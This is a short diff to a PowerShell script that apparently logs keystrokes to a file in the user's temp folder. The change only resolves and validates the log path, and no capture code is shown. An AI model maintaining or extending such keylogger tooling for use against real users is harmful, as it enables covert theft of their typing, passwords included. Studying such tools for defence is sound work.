@@ -33,7 +33,7 @@
 #>
     [CmdletBinding()] Param (
         [Parameter(Position = 0)]
-        [ValidateScript({Test-Path -Path (Split-Path -Parent $_) -PathType Container})]
+        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
         [String]
         $LogPath = "$($Env:TEMP)\key.log",
 
@@ -41,6 +41,8 @@
         [UInt32]
         $CollectionInterval
     )
+
+    $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)
 
     Write-Verbose "Logging keystrokes to $LogPath"
 
